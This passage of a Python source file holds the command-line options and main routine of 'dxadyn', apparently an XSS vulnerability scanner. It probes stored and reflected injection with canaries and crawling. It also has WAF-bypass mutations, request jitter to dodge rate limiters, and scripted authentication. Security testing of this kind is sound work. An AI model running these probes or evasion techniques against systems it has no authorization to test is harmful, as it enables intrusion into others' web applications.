    ap.add_argument("--method", default="post",
                    choices=["post", "get", "put", "patch", "delete"],
                    help="stored mode: HTTP method for the submission "
                         "(default post; use PUT/PATCH/DELETE for REST endpoints)")
    ap.add_argument("--check", default="",
                    help="stored mode: comma-separated URL(s) to check; `{CID}` is replaced with the canary id")
    ap.add_argument("--auto-check", action="store_true",
                    help="stored mode: don't require --check. Instead, after "
                         "submitting, crawl one hop from the target's origin (+ "
                         "any --auto-check-from seeds + the submit's landing "
                         "page) and verdict every page whose body contains the "
                         "canary. Turns stored mode into an autonomous hunter.")
    ap.add_argument("--auto-check-from", default="",
                    help="stored mode + --auto-check: extra seed URL(s) to "
                         "start the crawl from, comma-separated")
    ap.add_argument("--auto-check-max", type=int, default=60,
                    help="stored mode + --auto-check: cap candidate pages "
                         "(default 60)")
    ap.add_argument("--json-body", default="",
                    help="stored mode: POST raw JSON to --target instead of a "
                         "form. Use {CANARY} in the template where the payload "
                         "should land. Example: --json-body "
                         "'{\"tags\":\"{CANARY}\",\"title\":\"probe\"}' "
                         "(the SPA/REST admin path).")
    ap.add_argument("--header-target", default="",
                    help="stored mode: inject the canary into this HTTP header "
                         "on the submit request instead of a form field. "
                         "Example: --header-target True-Client-IP -- catches "
                         "the stored header-XSS class (Bludit Finding #8 shape).")
    ap.add_argument("--csrf-field", default="tokenCSRF",
                    help="hidden CSRF field name (default tokenCSRF); empty to disable")
    ap.add_argument("--variants", default="body",
                    help="stored mode: comma-separated payload variants to try; "
                         "each variant gets its own cid + probe. Choices: "
                         "body (default), title-breakout, attr-breakout, "
                         "script-breakout, url-scheme, or `all`. Example: "
                         "--variants title-breakout,attr-breakout picks up "
                         "reflections that only execute after a </title> or "
                         "attribute-quote break, which the plain body payload "
                         "would only score as 'breakout-req'.")
    ap.add_argument("--waf-bypass", action="store_true",
                    help="stored mode: for each --variants entry, also probe "
                         "4 mutation shapes (case-swap, split-tag via HTML "
                         "comment, extra whitespace, URL-encoded angle "
                         "brackets). Each mutation has its own cid + verdict. "
                         "Useful when the base payload is blocked by a regex "
                         "WAF that anchors on `<dXsS>` literally.")

    ap.add_argument("--login", help="log in at this URL before probing (session persists)")
    ap.add_argument("--user", help="username for --login")
    ap.add_argument("--pass", dest="password", help="password for --login")
    ap.add_argument("--user-field", default="username", help="login form username field")
    ap.add_argument("--pass-field", default="password", help="login form password field")

    ap.add_argument("--html", metavar="FILE", default="",
                    help="also write a self-contained HTML report to FILE "
                         "(same visual language as dxa's HTML report)")
    ap.add_argument("--cookie", default="",
                    help="raw Cookie header to attach to every request "
                         "(paste from DevTools after logging in via the browser). "
                         "This is the escape hatch for SPA / OAuth / MFA logins "
                         "that dxadyn's form-based --login cannot handle.")
    ap.add_argument("--header", action="append", default=[],
                    help="extra header 'Name: value' (repeatable); e.g. "
                         "--header 'Authorization: Bearer eyJ...' or "
                         "--header 'X-CSRF-Token: abc'")

    # Phase 1.1: concurrency + rate limit + jitter
    ap.add_argument("--parallel", type=int, default=1, metavar="N",
                    help="run up to N submits in parallel (ThreadPoolExecutor). "
                         "Default 1 = sequential (historical behaviour). "
                         "10 is a sensible upper bound for a friendly local target; "
                         "combine with --rate to stay polite. Fan-out paths that "
                         "benefit most: --variants all --waf-bypass (25 shapes -> "
                         "one round-trip's worth of wall-clock with N=10).")
    ap.add_argument("--rate", type=float, default=0, metavar="RPS",
                    help="token-bucket rate limit in requests per second across "
                         "all workers. 0 = unlimited (default). Set with --parallel "
                         "to cap the burst - e.g. --parallel 10 --rate 20 lets 10 "
                         "workers share a 20/s budget so the target sees at most "
                         "20 requests per wall-clock second.")
    ap.add_argument("--jitter", default="", metavar="MIN-MAX",
                    help="sleep a random duration in [MIN, MAX] milliseconds "
                         "before every request. Format: '100-500' (both int). "
                         "Helps avoid pattern-matched rate limiters that trigger "
                         "on evenly-spaced probes.")

    # Phase 0.2: false-negative discipline
    ap.add_argument("--verbose", "-v", action="store_true",
                    help="print one [skip] line to stderr for every submit "
                         "the SERVER actively rejected (403, 429, WAF-flavoured "
                         "400/503, connection-error). Silence in the findings "
                         "column no longer means 'target is safe' - it means "
                         "'nothing found AND K submits were blocked, here they are'.")
    ap.add_argument("--waf-log", metavar="FILE", default="",
                    help="append every rejected canary (reason, status, cid, "
                         "method, url, canary) as a tab-separated row to FILE. "
                         "Best-effort; a failed write never aborts the scan.")

    # Phase 1.3: JSON workflow chaining
    ap.add_argument("--flow", metavar="FILE", default="",
                    help="run a JSON flow file - a series of HTTP steps with "
                         "{VAR}/{RND}/{CANARY}/{CID} substitution and JSONPath "
                         "save/restore between steps. Any step with \"verdict\": "
                         "true is checked against the canary marker. See "
                         "bench/flows/ for examples. Zero-dep (json > yaml).")

    # Phase 1.5: macro-based auth
    ap.add_argument("--auth-flow", metavar="FILE", default="",
                    help="run a JSON auth flow BEFORE the scan starts. Same "
                         "engine as --flow. On success: if the flow has a "
                         "top-level `auth: {header, value}` field, the "
                         "substituted header (e.g. 'Authorization: Bearer "
                         "{token}') is installed into every subsequent "
                         "request. Otherwise cookies from the login steps "
                         "stay in the cookie jar. Replaces --login/--user/"
                         "--pass for anything more complex than a single "
                         "HTML form POST.")

    args = ap.parse_args()

    # Wire Phase 0.2 CLI flags into the module-level state that _record_skip reads
    global VERBOSE, WAF_LOG_FILE
    VERBOSE = bool(args.verbose)
    WAF_LOG_FILE = args.waf_log or None
    SKIPPED_SUBMITS.clear()

    # Phase 1.1: wire concurrency / rate / jitter into module state
    global PARALLEL_WORKERS, _RATE_LIMITER, JITTER_MS_MIN, JITTER_MS_MAX
    PARALLEL_WORKERS = max(1, int(args.parallel))
    _RATE_LIMITER = _TokenBucket(args.rate) if args.rate > 0 else None
    if args.jitter:
        try:
            lo, hi = (int(x.strip()) for x in args.jitter.split("-", 1))
            JITTER_MS_MIN, JITTER_MS_MAX = min(lo, hi), max(lo, hi)
        except ValueError:
            print(f"[dxadyn] --jitter must be 'MIN-MAX' millis, got {args.jitter!r}",
                  file=sys.stderr)
            sys.exit(2)
    else:
        JITTER_MS_MIN = JITTER_MS_MAX = 0
    if PARALLEL_WORKERS > 1 or _RATE_LIMITER or JITTER_MS_MAX:
        _bits = []
        if PARALLEL_WORKERS > 1: _bits.append(f"parallel={PARALLEL_WORKERS}")
        if _RATE_LIMITER:        _bits.append(f"rate={args.rate}/s")
        if JITTER_MS_MAX:        _bits.append(f"jitter={JITTER_MS_MIN}-{JITTER_MS_MAX}ms")
        print(f"[dxadyn] concurrency: {', '.join(_bits)}")

    if args.cookie:
        apply_cookie(args.cookie)
        print(f"[dxadyn] session cookie attached to every request ({len(args.cookie)} chars)")
    for spec in args.header:
        if apply_header(spec):
            print(f"[dxadyn] extra header set: {spec.split(':', 1)[0].strip()}")
        else:
            print(f"[dxadyn] --header ignored (need 'Name: value'): {spec!r}",
                  file=sys.stderr)

    # Phase 1.5: --auth-flow runs BEFORE the scan proper (--flow / --stored /
    # reflected) so any subsequent HTTP path picks up the installed auth
    # header + cookie jar automatically.
    if args.auth_flow:
        if args.login:
            print("[dxadyn] both --auth-flow and --login given; "
                  "--auth-flow wins, --login ignored", file=sys.stderr)
        aflow = _load_flow(args.auth_flow)
        if "__error__" in aflow:
            print(f"[dxadyn] {aflow['__error__']}", file=sys.stderr)
            sys.exit(2)
        asummary = run_auth_flow(aflow)
        if asummary["error"]:
            print(f"[dxadyn] auth-flow error: {asummary['error']}",
                  file=sys.stderr)
            sys.exit(2)
        if asummary["auth_header"]:
            hname, _ = asummary["auth_header"]
            print(f"[dxadyn] auth-flow '{asummary['name']}' installed "
                  f"'{hname}' header + {asummary['steps_run']} step(s)")
        elif asummary["authenticated"]:
            print(f"[dxadyn] auth-flow '{asummary['name']}' set cookies "
                  f"({asummary['steps_run']} step(s))")
        else:
            print(f"[dxadyn] auth-flow '{asummary['name']}' completed but "
                  f"nothing stuck (no header, no cookie). Continuing "
                  f"unauthenticated.", file=sys.stderr)

        # If the operator ONLY passed --auth-flow (no scan mode selected),
        # exit clean after auth installation - useful for a two-step run
        # where the caller composes multiple dxadyn invocations.
        if not (args.stored or args.flow or args.url):
            sys.exit(0)

    elif args.login:
        if not (args.user and args.password):
            print("[dxadyn] --login requires --user and --pass", file=sys.stderr)
            sys.exit(2)
        ok = login(args.login, args.user, args.password,
                   user_field=args.user_field, pass_field=args.pass_field,
                   csrf_field=args.csrf_field or None)
        print(f"[dxadyn] login {args.login} -> {'OK' if ok else 'FAILED (continuing anyway)'}")

    # Phase 1.3: --flow short-circuits the stored/reflected paths. A flow
    # carries its own steps + verdict step(s); we just run it and print.
    if args.flow:
        flow = _load_flow(args.flow)
        if "__error__" in flow:
            print(f"[dxadyn] {flow['__error__']}", file=sys.stderr)
            sys.exit(2)
        summary = run_flow(flow)
        print(f"[dxadyn] flow '{summary['name']}' ran {summary['steps_run']} step(s)")
        if summary["error"]:
            print(f"[dxadyn] flow error: {summary['error']}", file=sys.stderr)
            sys.exit(1)
        hits = [v for v in summary["verdicts"] if v["reflection"] == "unencoded"]
        if hits:
            for v in hits:
                print(f"  [EXECUTABLE] verdict at {v['step']}: {v['url']} "
                      f"(HTTP {v['status']}, marker survived raw)")
            sys.exit(0)
        elif summary["verdicts"]:
            for v in summary["verdicts"]:
                print(f"  [{v['reflection']}] verdict at {v['step']}: {v['url']} (HTTP {v['status']})")
            sys.exit(0)
        else:
            print("[dxadyn] flow ran; no verdict step defined (add \"verdict\": true).")
            sys.exit(0)

    if args.stored:
        if not args.target:
            print("[dxadyn] --stored requires --target", file=sys.stderr)
            sys.exit(2)
        # exactly one submission shape must be selected
        shape_flags = sum(bool(x) for x in
                          (args.target_field, args.json_body, args.header_target))
        if shape_flags != 1:
            print("[dxadyn] --stored needs EXACTLY one of --target-field, "
                  "--json-body, or --header-target", file=sys.stderr)
            sys.exit(2)
        if not (args.check or args.auto_check):
            print("[dxadyn] --stored needs either --check URL[,URL] or --auto-check",
                  file=sys.stderr)
            sys.exit(2)

        shape_desc = (f"field='{args.target_field}'" if args.target_field else
                      ("json body" if args.json_body else
                       f"header='{args.header_target}'"))

        # v3.10: resolve --variants (comma-list, or "all"); default = body
        vraw = (args.variants or "body").strip().lower()
        if vraw == "all":
            variants = list(PAYLOAD_VARIANTS.keys())
        else:
            variants = [v.strip() for v in vraw.split(",") if v.strip()]
            unknown = [v for v in variants if v not in PAYLOAD_VARIANTS]
            if unknown:
                print(f"[dxadyn] unknown --variants: {unknown}. Valid: "
                      f"{list(PAYLOAD_VARIANTS.keys())} or 'all'", file=sys.stderr)
                sys.exit(2)
        vlabel = "" if variants == ["body"] else f" variants=[{','.join(variants)}]"
        if args.waf_bypass:
            vlabel += " +waf-bypass(x4/variant)"
        # total shapes = variants * (1 + 4 mutations if waf_bypass else 1)
        total_shapes = len(variants) * (5 if args.waf_bypass else 1)

        if args.auto_check:
            seeds = [u.strip() for u in args.auto_check_from.split(",") if u.strip()]
            print(f"[dxadyn] STORED-AUTO probe: {args.target} {shape_desc}{vlabel} "
                  f"-> autonomous crawl (seeds={len(seeds)+2}, max={args.auto_check_max}) "
                  f"- authorized/local only\n")
            findings, cid, meta = probe_stored_auto(
                args.target, args.target_field, _parse_kv_list(args.extra),
                seeds, method=args.method, csrf_field=args.csrf_field or "",
                max_links=args.auto_check_max,
                json_body=args.json_body or None,
                header_target=args.header_target or None,
                variants=variants, waf_bypass=args.waf_bypass)
            print(f"[dxadyn] canary id = {cid}{' (of ' + str(total_shapes) + ' shapes)' if total_shapes > 1 else ''}")
            print(f"[dxadyn] submit landed at: {meta['submit_landing']}")
            print(f"[dxadyn] crawled {meta['checked_pages']}/{meta['candidates']} pages")
        else:
            checks = [u.strip() for u in args.check.split(",") if u.strip()]
            print(f"[dxadyn] STORED probe: {args.target} {shape_desc}{vlabel} "
                  f"-> checking {len(checks)} URL(s) - authorized/local only\n")
            findings, cid = probe_stored(args.target, args.target_field,
                                         _parse_kv_list(args.extra), checks,
                                         method=args.method,
                                         csrf_field=args.csrf_field or "",
                                         json_body=args.json_body or None,
                                         header_target=args.header_target or None,
                                         variants=variants,
                                         waf_bypass=args.waf_bypass)
            print(f"[dxadyn] canary id = {cid}{' (of ' + str(total_shapes) + ' shapes)' if total_shapes > 1 else ''}")

        if args.html:
            mode = "stored-auto" if args.auto_check else "stored"
            meta = {"target": args.target, "shape": shape_desc,
                    "canary_id": cid}
            if args.auto_check:
                meta["submit_landing"] = meta.get("submit_landing")
            with open(args.html, "w", encoding="utf-8") as fh:
                fh.write(render_html(findings, args.target, mode, meta))
            print(f"[dxadyn] HTML report -> {args.html}")

        if not findings:
            print("No unencoded stored reflection found.")
            _print_skip_summary()
            sys.exit(0)
        for f in findings:
            tag = "UNENCODED (HTML injection)" if f["reflection"] == "unencoded" \
                else "attribute-breakout quote"
            mode = " [auto]" if f.get("auto_discovered") else ""
            ctx = f.get("context", "?")
            sev = f.get("severity", "-")
            variant = f.get("variant", "body")
            vtag = f" variant={variant}" if variant != "body" else ""
            dup = len(f.get("duplicates", []))
            dup_s = f"  (+{dup} more URLs, same bug)" if dup else ""
            print(f"{f['check_url']}  [{sev.upper()}] context={ctx}{vtag}{mode}  "
                  f"stored via {f['target']} field '{f['field']}'  -> {tag}  "
                  f"(submit HTTP {f['sub_status']}, check HTTP {f['check_status']}){dup_s}")
        execs = sum(1 for f in findings if f.get("severity") == "executable")
        breakout = sum(1 for f in findings if f.get("severity") == "breakout-req")
        print(f"\n{len(findings)} unique stored candidate(s) - "
              f"{execs} EXECUTABLE (body/free context; runs as-is), "
              f"{breakout} need a follow-on breakout (title/attr/script context). "
              f"Confirm each in the browser.")
        _print_skip_summary()
        sys.exit(1)

    # --- reflected (v1) path ---
    if not args.url:
        ap.error("either a positional URL (reflected mode) or --stored is required")

    # v3.10: reflected mode also honours --variants + --waf-bypass
    vraw = (args.variants or "body").strip().lower()
    if vraw == "all":
        variants = list(PAYLOAD_VARIANTS.keys())
    else:
        variants = [v.strip() for v in vraw.split(",") if v.strip()]
        unknown = [v for v in variants if v not in PAYLOAD_VARIANTS]
        if unknown:
            print(f"[dxadyn] unknown --variants: {unknown}. Valid: "
                  f"{list(PAYLOAD_VARIANTS.keys())} or 'all'", file=sys.stderr)
            sys.exit(2)
    vlabel = "" if variants == ["body"] else f" variants=[{','.join(variants)}]"
    if args.waf_bypass:
        vlabel += " +waf-bypass(x4/variant)"

    print(f"[dxadyn] probing {args.url} (depth={args.depth}){vlabel} - authorized/local only\n")
    findings = crawl(args.url, args.depth, variants=variants, waf_bypass=args.waf_bypass)
    if args.probe_headers:
        hdrs = [h.strip() for h in args.probe_headers.split(",") if h.strip()]
        print(f"[dxadyn] header probe: {', '.join(hdrs)}")
        findings += probe_headers(args.url, hdrs, variants=variants,
                                  waf_bypass=args.waf_bypass)

    if args.html:
        meta = {"depth": str(args.depth)}
        if args.probe_headers:
            meta["probe_headers"] = args.probe_headers
        if variants != ["body"]:
            meta["variants"] = ",".join(variants)
        if args.waf_bypass:
            meta["waf_bypass"] = "on"
        with open(args.html, "w", encoding="utf-8") as fh:
            fh.write(render_html(findings, args.url, "reflected", meta))
        print(f"[dxadyn] HTML report -> {args.html}")

    if not findings:
        print("No unencoded reflections found. (Inputs may be encoded, POST-guarded, or absent.)")
        _print_skip_summary()
        sys.exit(0)

    for f in findings:
        tag = "UNENCODED (HTML injection)" if f["reflection"] == "unencoded" \
            else "attribute-breakout quote"
        ctx = f.get("context", "?")
        sev = f.get("severity", "-")
        variant = f.get("variant", "body")
        vtag = f" variant={variant}" if variant != "body" else ""
        print(f"{f['url']}  [{sev.upper()}] context={ctx}{vtag}  "
              f"{f['method']} param '{f['param']}'  -> {tag}  (HTTP {f['status']})")
    execs = sum(1 for f in findings if f.get("severity") == "executable")
    breakout = sum(1 for f in findings if f.get("severity") == "breakout-req")
    print(f"\n{len(findings)} reflected candidate(s) - "
          f"{execs} EXECUTABLE (body/free context), "
          f"{breakout} need a follow-on breakout. "
          f"Confirm each in the browser.")
    _print_skip_summary()
    sys.exit(1)


if __name__ == "__main__":
    main()
